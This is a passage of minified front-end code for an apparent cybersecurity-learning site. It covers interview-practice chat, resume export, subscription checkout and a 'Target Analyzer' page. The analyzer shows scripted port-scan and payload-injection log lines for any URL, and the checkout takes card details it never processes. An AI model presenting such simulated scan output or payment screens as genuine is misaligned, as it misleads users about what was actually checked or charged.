ENCRYPTED PARSING ACTIVE"})]})]})]})]})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-4",children:[e.jsxs("button",{onClick:()=>B("technical"),disabled:R,className:"group p-4 bg-[#0A0F0A] border border-[#00FF88]/30 hover:border-[#00FF88] rounded-xl transition-all hover:shadow-[0_0_20px_rgba(0,255,136,0.1)] text-left disabled:opacity-50 disabled:cursor-not-allowed",children:[e.jsx("div",{className:"h-10 w-10 rounded-lg bg-[#00FF88]/10 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform",children:e.jsx(He,{className:"h-6 w-6 text-[#00FF88]"})}),e.jsx("h3",{className:"text-[#EAEAEA] font-bold mb-1",children:"TECHNICAL"}),e.jsx("p",{className:"text-xs text-[#00B37A]",children:"Cybersecurity protocols & coding assessments."})]}),e.jsxs("button",{onClick:()=>B("hr"),disabled:R,className:"group p-4 bg-[#0A0F0A] border border-[#FF00FF]/30 hover:border-[#FF00FF] rounded-xl transition-all hover:shadow-[0_0_20px_rgba(255,0,255,0.1)] text-left disabled:opacity-50 disabled:cursor-not-allowed",children:[e.jsx("div",{className:"h-10 w-10 rounded-lg bg-[#FF00FF]/10 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform",children:e.jsx(Ut,{className:"h-6 w-6 text-[#FF00FF]"})}),e.jsx("h3",{className:"text-[#EAEAEA] font-bold mb-1",children:"BEHAVIORAL"}),e.jsx("p",{className:"text-xs text-[#FF00FF]/80",children:"Culture fit & situational analysis."})]}),e.jsxs("button",{onClick:()=>B("aptitude"),disabled:R,className:"group p-4 bg-[#0A0F0A] border border-[#00FFFF]/30 hover:border-[#00FFFF] rounded-xl transition-all hover:shadow-[0_0_20px_rgba(0,255,255,0.1)] text-left disabled:opacity-50 disabled:cursor-not-allowed",children:[e.jsx("div",{className:"h-10 w-10 rounded-lg bg-[#00FFFF]/10 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform",children:e.jsx(ad,{className:"h-6 w-6 text-[#00FFFF]"})}),e.jsx("h3",{className:"text-[#EAEAEA] font-bold mb-1",children:"APTITUDE"}),e.jsx("p",{className:"text-xs text-[#00FFFF]/80",children:"Logic puzzles & cognitive testing."})]})]})]}),a.map(ne=>e.jsxs("div",{className:`flex flex-col ${ne.sender==="user"?"items-end":"items-start"}`,children:[e.jsx("div",{className:`flex ${ne.sender==="user"?"justify-end":"justify-start"} w-full`,children:e.jsxs("div",{className:`max-w-[80%] rounded-2xl p-4 ${ne.sender==="user"?"bg-[#00FF88]/10 border border-[#00FF88]/20 text-[#EAEAEA] rounded-tr-none":ne.type==="feedback"?ne.feedback?.isCorrect?"bg-[#00FF88]/5 border border-[#00FF88]/30 text-[#00FF88] rounded-tl-none":"bg-[#FF0055]/5 border border-[#FF0055]/30 text-[#FF0055] rounded-tl-none":"bg-[#0A0F0A] border border-[#00B37A]/30 text-[#00B37A] rounded-tl-none shadow-[0_0_15px_rgba(0,255,136,0.05)]"}`,children:[e.jsxs("div",{className:"flex items-center gap-2 mb-1 opacity-50 text-[10px] uppercase tracking-wider font-bold",children:[ne.sender==="user"?e.jsx(zt,{className:"h-3 w-3"}):e.jsx(nd,{className:"h-3 w-3"}),ne.sender==="user"?"OPERATOR":"CORTEX"]}),e.jsx("p",{className:"whitespace-pre-wrap leading-relaxed",children:ne.text}),e.jsx("p",{className:"text-[10px] opacity-30 mt-2 text-right",children:ne.timestamp.toLocaleTimeString([],{hour:"2-digit",minute:"2-digit"})})]})}),ne.type==="feedback"&&d&&ne===a[a.length-1]&&e.jsx("div",{className:"mt-4 flex flex-col items-start gap-2 animate-in fade-in slide-in-from-left-4",children:e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsxs("button",{onClick:()=>ae(d),className:"px-6 py-2 bg-[#00FF88]/10 hover:bg-[#00FF88]/20 border border-[#00FF88]/50 text-[#00FF88] text-xs font-bold rounded-full transition-all",children:[e.jsx(Ba,{className:"h-3 w-3 inline-block mr-2"}),"NEXT MODULE NOW"]}),e.jsx("span",{className:"text-[10px] text-[#00B37A] animate-pulse",children:"Auto-advancing in 5s..."})]})})]},ne.id)),o&&e.jsx("div",{className:"flex justify-start",children:e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00B37A]/30 rounded-2xl rounded-tl-none p-4 flex items-center gap-2",children:[e.jsx("div",{className:"w-2 h-2 bg-[#00FF88] rounded-full animate-bounce",style:{animationDelay:"0ms"}}),e.jsx("div",{className:"w-2 h-2 bg-[#00FF88] rounded-full animate-bounce",style:{animationDelay:"150ms"}}),e.jsx("div",{className:"w-2 h-2 bg-[#00FF88] rounded-full animate-bounce",style:{animationDelay:"300ms"}}),e.jsx("span",{className:"text-xs text-[#00B37A] ml-2 font-mono",children:"ANALYZING NEURAL PATTERNS..."})]})}),e.jsx("div",{ref:H})]}),e.jsx("div",{className:"p-4 bg-[#0A0F0A] border-t border-[#00FF88]/10",children:e.jsxs("div",{className:"flex gap-4",children:[e.jsxs("div",{className:"flex-1 relative",children:[e.jsx("input",{type:"text",value:s,onChange:ne=>i(ne.target.value),onKeyPress:ne=>ne.key==="Enter"&&xe(),placeholder:d?"Enter response...":"Select a protocol above...",disabled:!d||o,className:"w-full bg-[#000000] border border-[#00FF88]/20 rounded-xl pl-4 pr-12 py-4 text-[#EAEAEA] focus:outline-none focus:border-[#00FF88]/50 focus:ring-1 focus:ring-[#00FF88]/20 placeholder-[#00B37A]/30 disabled:opacity-50 disabled:cursor-not-allowed"}),e.jsx("button",{className:"absolute right-3 top-1/2 -translate-y-1/2 text-[#00B37A] hover:text-[#00FF88] transition-colors",children:e.jsx(ld,{className:"h-5 w-5"})})]}),e.jsx("button",{onClick:xe,disabled:!s.trim()||o||!d,className:"bg-[#00FF88] hover:bg-[#00CC66] text-black rounded-xl px-6 flex items-center justify-center transition-all disabled:opacity-50 disabled:cursor-not-allowed hover:shadow-[0_0_15px_rgba(0,255,136,0.3)]",children:e.jsx(A0,{className:"h-5 w-5"})})]})})]})},R2=()=>{const{user:a}=Ie(),n=v.useRef(null),[s,i]=v.useState(!1),o=async()=>{if(n.current){i(!0);try{const[c,d]=await Promise.all([pr(()=>import("./html2canvas.esm-DXEQVQnt.js"),[]),pr(()=>import("./jspdf.es.min-UMHnq2_i.js"),[])]),m=c.default,f=d.default,x=await m(n.current,{scale:2,backgroundColor:"#ffffff"}),p=x.toDataURL("image/png"),b=new f({orientation:"portrait",unit:"px",format:"a4"}),w=b.internal.pageSize.getWidth(),j=x.width/x.height,N=w/j;b.addImage(p,"PNG",0,0,w,N),b.save(`OPERATOR_RESUME_${a?.name?.toUpperCase()||"UNKNOWN"}.pdf`)}catch(c){console.error("Failed to generate PDF:",c),alert("Failed to generate resume. Check console for details.")}finally{i(!1)}}};return e.jsxs("div",{className:"p-6 space-y-8 min-h-screen animate-fade-in text-[#EAEAEA]",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-[#00FF88]/10 pb-6",children:[e.jsxs("div",{children:[e.jsxs("h1",{className:"text-3xl font-black tracking-tighter text-white uppercase",children:["Operator ",e.jsx("span",{className:"text-[#00FF88]",children:"Resume"})]}),e.jsx("p",{className:"text-[#00B37A] font-mono text-sm mt-1",children:"AUTO-GENERATED CAREER PROFILE"})]}),e.jsx("button",{onClick:o,disabled:s,className:"bg-[#00FF88] hover:bg-[#00CC66] text-black font-bold py-2 px-6 rounded-lg flex items-center gap-2 transition-all hover:shadow-[0_0_20px_rgba(0,255,136,0.3)] disabled:opacity-50",children:s?e.jsxs(e.Fragment,{children:[e.jsx("div",{className:"h-4 w-4 border-2 border-black border-t-transparent rounded-full animate-spin"}),"ENCRYPTING..."]}):e.jsxs(e.Fragment,{children:[e.jsx(Us,{className:"h-4 w-4"}),"EXPORT PDF"]})})]}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-8",children:[e.jsx("div",{className:"lg:col-span-1 bg-[#2A2A2A] p-8 rounded-xl overflow-hidden shadow-2xl border border-white/10",children:e.jsxs("div",{ref:n,className:"bg-white text-black p-8 min-h-[842px] w-full max-w-[595px] mx-auto shadow-lg relative",style:{fontFamily:"Inter, sans-serif"},children:[e.jsxs("div",{className:"border-b-4 border-black pb-6 mb-6 flex justify-between items-start",children:[e.jsxs("div",{children:[e.jsx("h1",{className:"text-4xl font-black uppercase tracking-tighter mb-2",children:a?.name||"OPERATOR NAME"}),e.jsxs("p",{className:"text-lg font-mono text-gray-600 tracking-widest",children:[a?.level||"NOVICE"," OPERATOR"]})]}),e.jsxs("div",{className:"text-right text-sm space-y-1",children:[e.jsxs("div",{className:"flex items-center justify-end gap-2",children:[e.jsx("span",{children:a?.email||"operator@cyber.net"}),e.jsx(_d,{className:"h-3 w-3"})]}),e.jsxs("div",{className:"flex items-center justify-end gap-2",children:[e.jsx("span",{children:"Remote / Worldwide"}),e.jsx(_0,{className:"h-3 w-3"})]}),e.jsxs("div",{className:"flex items-center justify-end gap-2",children:[e.jsxs("span",{children:["cybercoach.dev/u/",a?.id?.slice(0,8)||"unknown"]}),e.jsx(In,{className:"h-3 w-3"})]})]})]}),e.jsxs("div",{className:"grid grid-cols-3 gap-8",children:[e.jsxs("div",{className:"col-span-1 space-y-6 border-r border-gray-200 pr-6",children:[e.jsxs("section",{children:[e.jsxs("h3",{className:"font-black uppercase tracking-widest border-b border-black mb-3 pb-1 flex items-center gap-2",children:[e.jsx(ze,{className:"h-4 w-4"})," Skills"]}),e.jsxs("ul",{className:"space-y-2 text-sm",children:[e.jsx("li",{className:"font-bold",children:"Network Security"}),e.jsx("li",{children:"Penetration Testing"}),e.jsx("li",{children:"Incident Response"}),e.jsx("li",{children:"Cryptography"}),e.jsx("li",{children:"Python / Bash"}),e.jsx("li",{children:"Linux Administration"})]})]}),e.jsxs("section",{children:[e.jsxs("h3",{className:"font-black uppercase tracking-widest border-b border-black mb-3 pb-1 flex items-center gap-2",children:[e.jsx(tt,{className:"h-4 w-4"})," Certs"]}),e.jsxs("ul",{className:"space-y-2 text-sm",children:[e.jsx("li",{className:"font-bold",children:"OWASP Top 10"}),e.jsx("li",{className:"text-xs text-gray-500",children:"Issued: 2024"}),e.jsx("li",{className:"font-bold mt-2",children:"Network Defense"}),e.jsx("li",{className:"text-xs text-gray-500",children:"Issued: 2024"})]})]})]}),e.jsxs("div",{className:"col-span-2 space-y-6",children:[e.jsxs("section",{children:[e.jsxs("h3",{className:"font-black uppercase tracking-widest border-b border-black mb-3 pb-1 flex items-center gap-2",children:[e.jsx(He,{className:"h-4 w-4"})," Mission History"]}),e.jsx("div",{className:"space-y-4",children:e.jsxs("div",{children:[e.jsx("h4",{className:"font-bold text-lg",children:"Cyber Coach Platform"}),e.jsx("p",{className:"text-sm font-mono text-gray-600 mb-1",children:"Top 10% Operator"}),e.jsx("p",{className:"text-sm text-gray-700",children:"Completed advanced security simulations including SQL Injection defense, XSS mitigation, and network traffic analysis. Maintained a high accuracy rating in tactical assessments."})]})})]}),e.jsxs("section",{children:[e.jsxs("h3",{className:"font-black uppercase tracking-widest border-b border-black mb-3 pb-1 flex items-center gap-2",children:[e.jsx(zt,{className:"h-4 w-4"})," Summary"]}),e.jsx("p",{className:"text-sm text-gray-700 leading-relaxed",children:"Dedicated cybersecurity professional with hands-on experience in vulnerability assessment and threat mitigation. Proven ability to analyze complex security challenges and implement robust defense strategies. Ready for deployment."})]})]})]}),e.jsxs("div",{className:"absolute bottom-8 left-8 right-8 border-t border-gray-200 pt-4 flex justify-between items-center text-xs text-gray-400 font-mono",children:[e.jsx("span",{children:"GENERATED BY CYBER COACH SYSTEM"}),e.jsxs("span",{children:["ID: ",a?.id?.slice(0,12).toUpperCase()]})]})]})}),e.jsx("div",{className:"space-y-6",children:e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/20 p-6 rounded-xl",children:[e.jsxs("h3",{className:"text-xl font-bold text-white mb-4 flex items-center gap-2",children:[e.jsx(He,{className:"h-5 w-5 text-[#00FF88]"}),"Resume Configuration"]}),e.jsx("p",{className:"text-[#00B37A] text-sm mb-6",children:"This document is auto-generated from your active service record. Complete more labs and earn certificates to upgrade your clearance level and expand your resume."}),e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{className:"flex items-center justify-between p-4 bg-[#000000] rounded-lg border border-[#00FF88]/10",children:[e.jsx("span",{className:"text-[#EAEAEA]",children:"Include Profile Photo"}),e.jsx("div",{className:"w-10 h-5 bg-[#00FF88]/20 rounded-full relative cursor-pointer",children:e.jsx("div",{className:"absolute right-1 top-1 w-3 h-3 bg-[#00FF88] rounded-full shadow-[0_0_10px_rgba(0,255,136,0.5)]"})})]}),e.jsxs("div",{className:"flex items-center justify-between p-4 bg-[#000000] rounded-lg border border-[#00FF88]/10",children:[e.jsx("span",{className:"text-[#EAEAEA]",children:"Show Clearance Level"}),e.jsx("div",{className:"w-10 h-5 bg-[#00FF88]/20 rounded-full relative cursor-pointer",children:e.jsx("div",{className:"absolute right-1 top-1 w-3 h-3 bg-[#00FF88] rounded-full shadow-[0_0_10px_rgba(0,255,136,0.5)]"})})]})]})]})})]})]})},Hm=[{id:"free",name:"Recruit",price:0,interval:"month",features:["Access to basic labs","Community support","Basic profile stats"]},{id:"pro",name:"Operative",price:29,interval:"month",features:["Unlimited access to all labs","CORTEX AI Mentor","Verified Certificates","Priority support","Career Mission Control"]}],I2={async getSubscriptionStatus(a){const{data:n,error:s}=await Z.from("users").select("subscription_tier, subscription_status").eq("id",a).single();return s?(console.error("Error fetching subscription:",s),null):n},async upgradeToPro(a){await new Promise(s=>setTimeout(s,2e3));const{error:n}=await Z.rpc("upgrade_to_pro",{user_id:a});return n?(console.error("Upgrade failed:",n),{success:!1,error:n.message}):{success:!0}},async cancelSubscription(){return await new Promise(a=>setTimeout(a,1e3)),{success:!0}}},L2=({isOpen:a,onClose:n,onSuccess:s})=>{const{user:i}=Ie(),[o,c]=v.useState(!1),[d,m]=v.useState("form"),[f,x]=v.useState(null),[p,b]=v.useState(""),[w,j]=v.useState(""),[N,k]=v.useState("");if(!a)return null;const F=async T=>{T.preventDefault(),c(!0),x(null);try{if(!i?.id)throw new Error("User not authenticated");const R=await I2.upgradeToPro(i.id);R.success?(m("success"),setTimeout(()=>{s(),n()},2e3)):x(R.error||"Payment failed")}catch{x("An unexpected error occurred")}finally{c(!1)}};return e.jsx("div",{className:"fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4",children:e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/20 rounded-xl w-full max-w-md overflow-hidden shadow-[0_0_50px_rgba(0,255,136,0.1)]",children:[e.jsxs("div",{className:"flex justify-between items-center p-6 border-b border-[#00FF88]/10",children:[e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx(ze,{className:"h-5 w-5 text-[#00FF88]"}),e.jsx("h2",{className:"text-xl font-bold text-white uppercase tracking-wide",children:"Secure Checkout"})]}),e.jsx("button",{onClick:n,className:"text-[#00B37A] hover:text-[#00FF88]",children:e.jsx(Co,{className:"h-5 w-5"})})]}),d==="form"?e.jsxs("form",{onSubmit:F,className:"p-6 space-y-6",children:[e.jsxs("div",{className:"bg-[#00FF88]/5 border border-[#00FF88]/10 rounded-lg p-4 flex items-center gap-3",children:[e.jsx("div",{className:"p-2 bg-[#00FF88]/10 rounded-full",children:e.jsx(vt,{className:"h-4 w-4 text-[#00FF88]"})}),e.jsxs("div",{children:[e.jsx("div",{className:"text-sm font-bold text-white",children:"Operative Tier (Pro)"}),e.jsx("div",{className:"text-xs text-[#00B37A]",children:"$29.00 / month"})]})]}),e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs font-mono text-[#00B37A] mb-1",children:"CARD NUMBER"}),e.jsxs("div",{className:"relative",children:[e.jsx(Yv,{className:"absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-[#00B37A]"}),e.jsx("input",{type:"text",value:p,onChange:T=>b(T.target.value.replace(/\D/g,"").slice(0,16)),placeholder:"0000 0000 0000 0000",className:"w-full bg-[#000000] border border-[#00FF88]/20 rounded-lg pl-10 pr-4 py-3 text-white focus:outline-none focus:border-[#00FF88] font-mono",required:!0})]})]}),e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs font-mono text-[#00B37A] mb-1",children:"EXPIRY"}),e.jsx("input",{type:"text",value:w,onChange:T=>j(T.target.value.replace(/\D/g,"").slice(0,4)),placeholder:"MM/YY",className:"w-full bg-[#000000] border border-[#00FF88]/20 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-[#00FF88] font-mono",required:!0})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs font-mono text-[#00B37A] mb-1",children:"CVC"}),e.jsx("input",{type:"text",value:N,onChange:T=>k(T.target.value.replace(/\D/g,"").slice(0,3)),placeholder:"123",className:"w-full bg-[#000000] border border-[#00FF88]/20 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-[#00FF88] font-mono",required:!0})]})]})]}),f&&e.jsx("div",{className:"text-red-500 text-sm bg-red-500/10 p-3 rounded border border-red-500/20",children:f}),e.jsx("button",{type:"submit",disabled:o,className:"w-full bg-[#00FF88] hover:bg-[#00CC66] text-black font-bold py-3 rounded-lg uppercase tracking-wide transition-all disabled:opacity-50 flex items-center justify-center gap-2",children:o?e.jsxs(e.Fragment,{children:[e.jsx("div",{className:"h-4 w-4 border-2 border-black border-t-transparent rounded-full animate-spin"}),"Processing..."]}):"Confirm Upgrade"}),e.jsx("div",{className:"text-center text-[10px] text-[#00B37A]/50 font-mono",children:"ENCRYPTED TRANSMISSION // 256-BIT SSL"})]}):e.jsxs("div",{className:"p-12 text-center flex flex-col items-center justify-center animate-in fade-in zoom-in",children:[e.jsx("div",{className:"w-16 h-16 bg-[#00FF88]/10 rounded-full flex items-center justify-center mb-6 border border-[#00FF88]/20",children:e.jsx(Pe,{className:"h-8 w-8 text-[#00FF88]"})}),e.jsx("h3",{className:"text-2xl font-black text-white uppercase mb-2",children:"Access Granted"}),e.jsx("p",{className:"text-[#00B37A]",children:"Welcome to the elite, Operative."})]})]})})},O2=()=>{const{user:a}=Ie(),[n,s]=v.useState(!1),i=a?.subscription_tier||"free";return e.jsxs("div",{className:"p-6 min-h-screen animate-fade-in text-[#EAEAEA]",children:[e.jsxs("div",{className:"max-w-5xl mx-auto",children:[e.jsxs("div",{className:"text-center mb-12",children:[e.jsxs("h1",{className:"text-4xl font-black tracking-tighter text-white uppercase mb-4",children:["Mission ",e.jsx("span",{className:"text-[#00FF88]",children:"Clearance"})]}),e.jsx("p",{className:"text-[#00B37A] text-lg",children:"Select your operational tier to unlock advanced capabilities."})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-8 max-w-4xl mx-auto",children:[e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/10 rounded-2xl p-8 flex flex-col relative overflow-hidden",children:[e.jsxs("div",{className:"mb-6",children:[e.jsx("h3",{className:"text-2xl font-bold text-white uppercase tracking-wide",children:"Recruit"}),e.jsxs("div",{className:"mt-4 flex items-baseline",children:[e.jsx("span",{className:"text-4xl font-black text-white",children:"$0"}),e.jsx("span",{className:"ml-2 text-[#00B37A]",children:"/ month"})]}),e.jsx("p",{className:"mt-4 text-sm text-gray-400",children:"Basic access for new operatives."})]}),e.jsx("ul",{className:"space-y-4 mb-8 flex-1",children:Hm[0].features.map((o,c)=>e.jsxs("li",{className:"flex items-start gap-3",children:[e.jsx(km,{className:"h-5 w-5 text-[#00B37A] shrink-0"}),e.jsx("span",{className:"text-sm text-[#EAEAEA]",children:o})]},c))}),e.jsx("button",{disabled:!0,className:"w-full py-3 rounded-lg border border-[#00FF88]/20 text-[#00B37A] font-bold uppercase tracking-wide opacity-50 cursor-not-allowed",children:"Current Status"})]}),e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88] rounded-2xl p-8 flex flex-col relative overflow-hidden shadow-[0_0_30px_rgba(0,255,136,0.1)]",children:[e.jsx("div",{className:"absolute top-0 right-0 bg-[#00FF88] text-black text-xs font-bold px-3 py-1 rounded-bl-lg uppercase tracking-wider",children:"Recommended"}),e.jsxs("div",{className:"mb-6",children:[e.jsxs("h3",{className:"text-2xl font-bold text-white uppercase tracking-wide flex items-center gap-2",children:["Operative ",e.jsx(Va,{className:"h-5 w-5 text-[#00FF88] fill-[#00FF88]"})]}),e.jsxs("div",{className:"mt-4 flex items-baseline",children:[e.jsx("span",{className:"text-4xl font-black text-white",children:"$29"}),e.jsx("span",{className:"ml-2 text-[#00B37A]",children:"/ month"})]}),e.jsx("p",{className:"mt-4 text-sm text-gray-400",children:"Full access for serious professionals."})]}),e.jsx("ul",{className:"space-y-4 mb-8 flex-1",children:Hm[1].features.map((o,c)=>e.jsxs("li",{className:"flex items-start gap-3",children:[e.jsx(km,{className:"h-5 w-5 text-[#00FF88] shrink-0"}),e.jsx("span",{className:"text-sm text-white font-medium",children:o})]},c))}),e.jsx("button",{onClick:()=>s(!0),disabled:i==="pro",className:"w-full bg-[#00FF88] hover:bg-[#00CC66] text-black font-bold py-3 rounded-lg uppercase tracking-wide transition-all hover:shadow-[0_0_20px_rgba(0,255,136,0.3)] disabled:opacity-50 disabled:cursor-not-allowed",children:i==="pro"?"Active Clearance":"Upgrade Clearance"})]})]})]}),e.jsx(L2,{isOpen:n,onClose:()=>s(!1),onSuccess:()=>{window.location.reload()}})]})},D2=()=>{const[a,n]=v.useState(""),[s,i]=v.useState(!1),[o,c]=v.useState(""),[d,m]=v.useState(null),[f,x]=v.useState([]),p=N=>{x(k=>[...k,`[${new Date().toLocaleTimeString()}] ${N}`])},b=async()=>{if(a){i(!0),m(null),x([]);try{p(`Initializing scan target: ${a}`),c("Resolving DNS..."),await new Promise(k=>setTimeout(k,800)),p("Target resolved. IP: 192.168.X.X (Masked)"),c("Port Scanning..."),await new Promise(k=>setTimeout(k,1200)),p("Open ports found: 80, 443, 8080"),c("Analyzing Headers..."),await new Promise(k=>setTimeout(k,1e3)),p("Injecting test payloads..."),c("Vulnerability Assessment...");const N=await zs.generateVulnerabilityReport(a);m({target:a,score:N.score,timestamp:new Date,vulnerabilities:N.vulnerabilities,summary:N.summary}),p("Scan complete. Report generated.")}catch(N){p("Error: Scan failed to complete."),console.error(N)}finally{i(!1),c("")}}},w=N=>N>=90?"text-[#00FF88]":N>=70?"text-yellow-400":"text-red-500",j=N=>{switch(N){case"critical":return"bg-red-500/20 text-red-500 border-red-500/50";case"high":return"bg-orange-500/20 text-orange-500 border-orange-500/50";case"medium":return"bg-yellow-500/20 text-yellow-500 border-yellow-500/50";case"low":return"bg-blue-500/20 text-blue-500 border-blue-500/50";default:return"bg-gray-500/20 text-gray-500"}};return e.jsx("div",{className:"min-h-screen bg-[#000000] text-[#EAEAEA] p-6 animate-fade-in font-mono",children:e.jsxs("div",{className:"max-w-6xl mx-auto space-y-8",children:[e.jsxs("div",{className:"text-center space-y-4",children:[e.jsxs("div",{className:"inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#00FF88]/10 border border-[#00FF88]/20 text-[#00FF88] text-xs mb-4",children:[e.jsx(xs,{className:"h-4 w-4 animate-pulse"}),"SYSTEM STATUS: ACTIVE"]}),e.jsxs("h1",{className:"text-4xl md:text-5xl font-black uppercase tracking-tighter text-white",children:["Target ",e.jsx("span",{className:"text-[#00FF88]",children:"Analyzer"})]}),e.jsx("p",{className:"text-[#00B37A] max-w-2xl mx-auto",children:"Advanced heuristic scanning engine. Detect vulnerabilities, misconfigurations, and security gaps in real-time."})]}),e.jsx("div",{className:"max-w-3xl mx-auto",children:e.jsxs("div",{className:"relative group",children:[e.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-[#00FF88] to-[#00CC66] rounded-xl blur opacity-20 group-hover:opacity-40 transition duration-500"}),e.jsxs("div",{className:"relative flex gap-2 bg-[#0A0F0A] p-2 rounded-xl border border-[#00FF88]/20",children:[e.jsx("div",{className:"flex items-center pl-4 text-[#00B37A]",children:e.jsx(In,{className:"h-5 w-5"})}),e.jsx("input",{type:"text",value:a,onChange:N=>n(N.target.value),placeholder:"Enter target URL (e.g., https://example.com)...",className:"flex-1 bg-transparent border-none focus:ring-0 text-[#EAEAEA] placeholder-[#00B37A]/30 h-12",onKeyDown:N=>N.key==="Enter"&&b()}),e.jsxs("button",{onClick:b,disabled:s||!a,className:"px-8 bg-[#00FF88] hover:bg-[#00CC66] text-black font-bold rounded-lg uppercase tracking-wide transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2",children:[s?e.jsx(xs,{className:"h-4 w-4 animate-spin"}):e.jsx(Dr,{className:"h-4 w-4"}),s?"Scanning":"Scan"]})]})]})}),s&&e.jsxs("div",{className:"max-w-3xl mx-auto bg-[#0A0F0A] border border-[#00FF88]/20 rounded-xl p-6 font-mono text-sm shadow-[0_0_50px_rgba(0,255,136,0.1)]",children:[e.jsxs("div",{className:"flex items-center justify-between mb-4 border-b border-[#00FF88]/10 pb-2",children:[e.jsxs("span",{className:"text-[#00FF88] flex items-center gap-2",children:[e.jsx(He,{className:"h-4 w-4"})," TERMINAL OUTPUT"]}),e.jsx("span",{className:"text-[#00B37A] animate-pulse",children:o})]}),e.jsxs("div",{className:"space-y-1 h-48 overflow-y-auto custom-scrollbar",children:[f.map((N,k)=>e.jsx("div",{className:"text-[#00B37A]/80",children:N},k)),e.jsx("div",{className:"text-[#00FF88] animate-pulse",children:"_"})]})]}),d&&!s&&e.jsxs("div",{className:"animate-in slide-in-from-bottom-4 duration-700",children:[e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-6 mb-8",children:[e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/20 rounded-xl p-6 flex flex-col items-center justify-center text-center relative overflow-hidden",children:[e.jsx("div",{className:"absolute inset-0 bg-[#00FF88]/5"}),e.jsx("h3",{className:"text-[#00B37A] font-bold uppercase tracking-widest text-sm mb-2 relative z-10",children:"Security Score"}),e.jsx("div",{className:`text-6xl font-black ${w(d.score)} mb-2 relative z-10`,children:d.score}),e.jsx("div",{className:"text-xs text-gray-500 uppercase tracking-wide relative z-10",children:"OUT OF 100"})]}),e.jsxs("div",{className:"md:col-span-2 bg-[#0A0F0A] border border-[#00FF88]/20 rounded-xl p-6 relative overflow-hidden",children:[e.jsx("div",{className:"absolute inset-0 bg-[#00FF88]/5"}),e.jsx("h3",{className:"text-[#00B37A] font-bold uppercase tracking-widest text-sm mb-4 relative z-10",children:"Executive Summary"}),e.jsx("p",{className:"text-[#EAEAEA] leading-relaxed relative z-10",children:d.summary})]})]}),e.jsxs("div",{className:"space-y-4",children:[e.jsxs("h3",{className:"text-xl font-bold text-white uppercase tracking-wide flex items-center gap-2",children:[e.jsx(or,{className:"h-5 w-5 text-yellow-500"}),"Detected Vulnerabilities"]}),d.vulnerabilities.length===0?e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/20 rounded-xl p-8 text-center",children:[e.jsx(Pe,{className:"h-12 w-12 text-[#00FF88] mx-auto mb-4"}),e.jsx("h4",{className:"text-xl font-bold text-white mb-2",children:"No Critical Issues Found"}),e.jsx("p",{className:"text-[#00B37A]",children:"Target appears secure based on heuristic analysis."})]}):e.jsx("div",{className:"grid gap-4",children:d.vulnerabilities.map((N,k)=>e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/10 rounded-xl p-6 hover:border-[#00FF88]/30 transition-all group",children:[e.jsx("div",{className:"flex flex-col md:flex-row md:items-start justify-between gap-4 mb-4",children:e.jsxs("div",{children:[e.jsxs("div",{className:"flex items-center gap-3 mb-2",children:[e.jsx("span",{className:`px-3 py-1 rounded text-xs font-bold uppercase tracking-wider border ${j(N.severity)}`,children:N.severity}),e.jsx("h4",{className:"text-lg font-bold text-white group-hover:text-[#00FF88] transition-colors",children:N.type})]}),e.jsx("p",{className:"text-gray-400 text-sm",children:N.description})]})}),e.jsxs("div",{className:"bg-black/50 rounded-lg p-4 border border-[#00FF88]/5",children:[e.jsxs("div",{className:"text-xs font-bold text-[#00B37A] uppercase tracking-wider mb-2 flex items-center gap-2",children:[e.jsx(vt,{className:"h-3 w-3"})," Remediation"]}),e.jsx("p",{className:"text-sm text-[#EAEAEA] font-mono",children:N.remediation})]})]},k))})]})]})]})})},Gm=({initialTab:a})=>{const{user:n,isAdmin:s,isTeacher:i}=Ie(),[o,c]=v.useState("dashboard"),[d,m]=v.useState(null),[f,x]=v.useState(null);if(v.useEffect(()=>{a&&c(a)},[a]),v.useEffect(()=>{const N=k=>{k.detail?.tab&&(c(k.detail.tab),m(null),x(null))};return window.addEventListener("navigateToTab",N),()=>{window.removeEventListener("navigateToTab",N)}},[]),!n)return e.jsx(fd,{});const p=N=>{m(N)},b=N=>{x(N)},w=()=>{if(o==="courses"&&d)return e.jsx(n2,{courseId:d,onBack:()=>m(null)});if(o==="labs"&&f)return e.jsx(m2,{labId:f,onBack:()=>x(null)});if(o==="landing")return e.jsx(fd,{});switch(o){case"analytics":return s()?e.jsx(Wm,{}):e.jsx(mo,{});case"my-courses":case"create-course":case"students":return i()?e.jsx(cp,{}):e.jsx(mo,{});case"dashboard":return e.jsx(mo,{});case"assessment":return s()?e.jsx(Wm,{}):e.jsx(Kj,{});case"proctor-demo":return e.jsx(Yj,{});case"courses":return e.jsx(Jj,{onCourseSelect:p});case"videos":return e.jsx(v2,{});case"labs":return e.jsx(a2,{onLabSelect:b});case"technical":return e.jsx(y2,{});case"certificates":return e.jsx(p2,{});case"notes":return e.jsx(j2,{});case"profile":return e.jsx(x2,{});case"community":return 